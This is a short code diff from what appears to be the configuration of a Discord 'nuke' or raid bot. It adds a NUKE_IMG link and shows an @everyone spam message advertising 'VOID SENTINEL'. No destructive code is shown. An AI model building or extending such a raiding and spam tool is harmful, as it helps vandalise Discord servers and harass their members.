@@ -9,6 +9,7 @@ OWNER_IDS = [1178569191276664842, 1470775670262202590] # dennis? and voby
 LOG_WEBHOOK = os.getenv("LOG_WEBHOOK", "") # make .env with LOG_WEBHOOK
 DEFAULT_BL_GUILD = [1531718828575424643] # vsentinel guild id
 SERVER_INVITE = "https://discord.gg/Ym6zpgrJPh"
+NUKE_IMG = "https://files.catbox.moe/7sq3oz.png"
 
 SPAMMSG = f"""
 ||@everyone|| BEST BOTS?? JOIN VOID SENTINEL
